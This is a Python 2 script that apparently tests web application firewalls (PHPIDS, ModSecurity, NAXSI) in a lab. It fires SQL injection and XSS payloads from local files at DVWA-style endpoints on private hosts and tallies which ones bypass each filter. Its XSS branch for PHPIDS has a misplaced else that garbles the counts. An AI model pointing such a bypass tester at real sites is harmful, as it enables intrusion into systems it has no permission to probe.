import urllib, urllib2, cookielib

# read all payload and sort them line by line without \n
with open("/home/mirza/Desktop/sqlipayloads") as f:
    sqlipayloads = f.read().splitlines()

with open("/home/mirza/Desktop/xsspayloads") as f:
    xsspayloads = f.read().splitlines()

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener2 = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
sufix = "&Submit=Submit#"
sufixss = "#"
hacked = ""
hdr = {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
                    'Accept-Encoding': 'none',
                    'Accept-Language': 'en-US,en;q=0.8',
                    'Connection': 'keep-alive'}

def getFlag(flag):
    if flag == 0:
        print "----------------------------"
        print "WAF: OFF"
        return;
    else:
        print "----------------------------"
        print "WAF: ON"
        return;

flag = 0

def phpids():
    flag = 0
    print "PHPIDS"
    hacked = ""
    menu2 = {}
    menu2['0'] = "Set PHPIDSv0.6 WAF"
    menu2['1'] = "SQLi"
    menu2['2'] = "XSS"
    menu2['3'] = "Exit"
    while True:
        options2 = menu2.keys()
        options2.sort()

        getFlag(flag)

        for entry in options2:
            print entry, menu2[entry]

        # Menu options
        selection2 = raw_input("Please select:")
        if selection2 == '0':
            if flag == 0:
                opener.open('http://192.168.1.210/index.php')
                opener2.open('http://192.168.1.210/security.php?phpids=on')
                flag = 1
            else:
                opener.open('http://192.168.1.210/index.php')
                opener2.open('http://192.168.1.210/security.php?phpids=off')
                flag = 0

        if selection2 == '1':
            count = 0
            attacksucc = 0
            attackfail = 0
            for payload in sqlipayloads:
                count += 1
                resp = opener.open(
                    'http://192.168.1.210/vulnerabilities/sqli/?id=' + urllib.quote_plus(payload) + sufix)
                print "Payload " + str(count) + ": " + payload + " passed to the web app"
                response = resp.read()
                # Check if WAF has been triggered
                if "Hacking" in response:
                    attackfail += 1
                    print "Payload " + str(count) + ": " + payload + " did not go through. Attack failed!"
                    print "-----------------------------------"
                else:
                    attacksucc += 1
                    print "Payload " + str(count) + ": " + payload + " succesfull"
                    print "-----------------------------------"
                    hacked += "number: " + str(count) + " - " + payload + "\n" 
                    #                       put in array those that succeeded
            print "Failed attacks: " + str(attackfail)
            print "Successful attacks: " + str(attacksucc)
            print hacked
        # print response
        #       break
        elif selection2 == '2':
            attacksucc = 0
            attackfail = 0
            count = 0
            for payload in xsspayloads:
                count += 1
                resp = opener.open(
                    'http://192.168.1.210/vulnerabilities/xss_r/?name=' + urllib.quote_plus(payload) + sufixss)
                print "Payload " + str(count) + ": " + payload + " passed to the web app"
                response = resp.read()
                # Check if WAF has been triggered
                if "Hacking" in response:
                    attackfail += 1
                    print "Payload " + str(count) + ": " + payload + " did not go through. Attack failed!"
                    print "-----------------------------------"
            else:
                attacksucc += 1
                print "Payload " + str(count) + ": " + payload + " succesfull. Attack succesfull!"
                print "-----------------------------------"
                hacked += "number: " + str(count) + " - " + payload + "\n" 
                # put in array those that sucseeded and show them
            print "Failed attacks: " + str(attackfail)
            print "Successful attacks: " + str(attacksucc)
            print hacked
        # print "XSS script now needs to run"
        elif selection2 == '3':
            break
        else:
            print ""

def modsec():
    flag = 0
    hacked = ""
    print "-----------"
    print "MODSECURITY"
    menu2 = {}
    menu2['0'] = "SecRuleEngine needs to be set ON/DetectionOnly in order to turn on or off WAF. /etc/httpd/conf.d/mod_security.conf"
    menu2['1'] = "SQLi"
    menu2['2'] = "XSS"
    menu2['3'] = "Exit"
    while True:
        options2 = menu2.keys()
        options2.sort()

        getFlag(flag)

        for entry in options2:
            print entry, menu2[entry]

        # Menu options
        selection2 = raw_input("Please select:")
        if selection2 == '0':
            if flag == 0:
                print "SSH to the modsecurity server and change to DetectionOnly - now it should show ON"
                flag = 1
            else:
                print "SSH and turn the WAF OFF"
                flag = 0

        if selection2 == '1':
            #       cj = cookielib.CookieJar()
            #       opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
            #        login_data = urllib.urlencode({'username' : username, 'password' : password})
            #        opener.open('http://192.168.57.100/index.php')
            #       opener2.open('http://192.168.57.100/security.php?phpids=on')
            # Test each payload from the file
            count = 0
            attacksucc = 0
            attackfail = 0

            for payload in sqlipayloads:
                count += 1
                site = "http://192.168.1.211/vulnerabilities/sqli/?id=" + urllib.quote_plus(
                    payload) + sufix  # its parsing with %...
                req = urllib2.Request(site, headers=hdr)
                print site
                try:
                    page = urllib2.urlopen(req)
                except urllib2.HTTPError, e:
                    resp = e.fp.read()

                # Check if WAF has been triggered
                if "Forbidden" in resp:
                    attackfail += 1
                    print "Payload " + str(count) + ": " + payload + " did not go through. Attack failed!"
                    print "-----------------------------------"
                else:
                    attacksucc += 1
                    print "Payload " + str(count) + ": " + payload + " succesfull"
                    print "-----------------------------------"
                    hacked +="number: " + str(count) + " - " +  payload + "\n" 
                    #                       put in array those that succeeded
            print "Failed attacks: " + str(attackfail)
            print "Successful attacks: " + str(attacksucc)
            print hacked
        # print response
        #       break
        elif selection2 == '2':
            count = 0
            attacksucc = 0
            attackfail = 0

            for payload in xsspayloads:
                count += 1
                site = "http://192.168.1.211/vulnerabilities/xss_r/?name=" + urllib.quote_plus(
                    payload) + sufixss  # its parsing with %...
                req = urllib2.Request(site, headers=hdr)
                print site
                try:
                    page = urllib2.urlopen(req)
                except urllib2.HTTPError, e:
                    resp = e.fp.read()

                # Check if WAF has been triggered
                if "Forbidden" in resp:
                    attackfail += 1
                    print "Payload " + str(count) + ": " + payload + " did not go through. Attack failed!"
                    print "-----------------------------------"
                else:
                    attacksucc += 1
                    print "Payload " + str(count) + ": " + payload + " succesfull"
                    print "-----------------------------------"
                    hacked +="number: " + str(count) + " - " +  payload + "\n" 
                    #                       put in array those that succeeded
            print "Failed attacks: " + str(attackfail)
            print "Successful attacks: " + str(attacksucc)
            print hacked
        # print "XSS script now needs to run"
        elif selection2 == '3':
            break
        else:
            print ""

def naxsi():
    flag = 0
    hacked = ""
    print "NAXSI"
    menu2 = {}
    menu2['0'] = "Change to SecRulesDisabled or SecRulesEnabled in /etc/nginx/naxsi.rules 192.168.1.212"
    menu2['1'] = "SQLi"
    menu2['2'] = "XSS"
    menu2['3'] = "Exit"
    while True:
        options2 = menu2.keys()
        options2.sort()

        getFlag(flag)

        for entry in options2:
            print entry, menu2[entry]

        # Menu options
        selection2 = raw_input("Please select:")
        if selection2 == '0':
            if flag == 0:
                print "SSH to the modsecurity server and change to DetectionOnly - now it should show ON"
                flag = 1
            else:
                print "SSH and turn the WAF OFF"
                flag = 0

        if selection2 == '1':
            #       cj = cookielib.CookieJar()
            #       opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
            #        login_data = urllib.urlencode({'username' : username, 'password' : password})
            #        opener.open('http://192.168.57.100/index.php')
            #       opener2.open('http://192.168.57.100/security.php?phpids=on')
            # Test each payload from the file
            count = 0
            attacksucc = 0
            attackfail = 0

            for payload in sqlipayloads:
                count += 1
                site = "http://192.168.1.212/vulnerabilities/sqli/?id=" + urllib.quote_plus(
                    payload) + sufix  # its parsing with %...
                req = urllib2.Request(site, headers=hdr)
                print site
		#page2 = urllib2.urlopen(req)
                try:
                    page = urllib2.urlopen(req)
                except urllib2.HTTPError, e:
                    resp = e.fp.read()

                # Check if WAF has been triggered
                if "404" in resp:
                    attackfail += 1
                    print "Payload " + str(count) + ": " + payload + " did not go through. Attack failed!"
                    print "-----------------------------------"
                else:
                    attacksucc += 1
                    print "Payload " + str(count) + ": " + payload + " succesfull"
                    hacked +="number: " + str(count) + " - " +  payload + "\n" 
                    print "-----------------------------------"
                    #                       put in array those that succeeded
            print "Failed attacks: " + str(attackfail)
            print "Successful attacks: " + str(attacksucc)
            print hacked
        # print response
        #       break
        elif selection2 == '2':
            #       cj = cookielib.CookieJar()
            #       opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
            #        login_data = urllib.urlencode({'username' : username, 'password' : password})
            #        opener.open('http://192.168.57.100/index.php')
            #       opener2.open('http://192.168.57.100/security.php?phpids=on')
            # Test each payload from the file
            count = 0
            attacksucc = 0
            attackfail = 0

            for payload in xsspayloads:
                count += 1
                site = "http://192.168.1.212/vulnerabilities/xss_r/?name=" + urllib.quote_plus(
                    payload) + sufixss  # its parsing with %...
                req = urllib2.Request(site, headers=hdr)
                #page2 = urllib2.urlopen(req)
                print site
                try:
                    page = urllib2.urlopen(req)
                except urllib2.HTTPError, e:
                    resp = e.fp.read()
                # Check if WAF has been triggered
                if "404" in resp:
                    attackfail += 1
                    print "Payload " + str(count) + ": " + payload + " did not go through. Attack failed!"
                    print "-----------------------------------"
                else:
                    attacksucc += 1
                    print "Payload " + str(count) + ": " + payload + " succesfull"
                    print "-----------------------------------"
                    hacked +="number: " + str(count) + " - " + payload + "\n" 
                    #                       put in array those that succeeded
            print "Failed attacks: " + str(attackfail)
            print "Successful attacks: " + str(attacksucc)
            print hacked
        # print "XSS script now needs to run"
        elif selection2 == '3':
            break
        else:
            print ""

print "Select firewall to attack"
menu = {}
menu['1'] = "PHPIDSv0.6"
menu['2'] = "MODSecurity"
menu['3'] = "NAXSI"

options = menu.keys()
options.sort()
for entry in options:
    print entry, menu[entry]

selection = raw_input("Select:")
if selection == '1':
    phpids()
elif selection == '2':
    modsec()
elif selection == '3':
    naxsi()
else:
    print "wrong input"


# print resp.read()
